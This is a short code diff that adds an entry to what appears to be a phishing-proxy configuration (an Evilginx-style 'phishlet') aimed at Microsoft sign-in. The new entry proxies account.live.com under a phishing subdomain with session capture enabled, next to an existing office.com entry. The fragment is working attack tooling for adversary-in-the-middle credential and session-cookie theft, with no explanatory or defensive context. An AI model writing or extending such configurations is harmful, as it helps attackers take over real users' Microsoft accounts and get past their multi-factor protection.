@@ -16,6 +16,13 @@ proxy_hosts:
       is_landing: false,
     }
   - {
+      phish_sub: "account",
+      orig_sub: "account",
+      domain: "live.com",
+      session: true,
+      is_landing: false,
+    }
+  - {
       phish_sub: "www",
       orig_sub: "www",
       domain: "office.com",
